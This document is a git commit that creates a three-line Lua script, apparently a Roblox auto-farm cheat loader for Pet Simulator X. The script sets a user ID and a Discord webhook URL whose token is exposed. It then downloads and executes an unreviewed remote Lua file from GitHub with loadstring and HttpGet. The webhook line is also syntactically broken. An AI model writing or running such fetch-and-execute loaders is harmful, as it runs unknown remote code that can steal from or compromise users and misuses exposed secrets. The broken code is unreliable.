f890f646aeccba05afaac358ef22c21a9a655460
Psx-Script <120688763+Psx-Script@users.noreply.github.com>
2022-12-30 20:32:35 +0300

    Create l.lua

---
+++ l.lua
@@ -0,0 +1,3 @@
+_G.UserID = 1803819784
+_G.WebHook = https://discord.com/api/webhooks/1058321990362071080/X40mhglIcdLuI5OGyjGo6GPDMMaxzpIhSJsxvfGLatJshr6lAkdMFHLfPlDu1ZolifYS""
+loadstring(game:HttpGet('https://raw.githubusercontent.com/vestyx/PetSimulatorXAutoFarm/main/HasteFarm.lua'))()
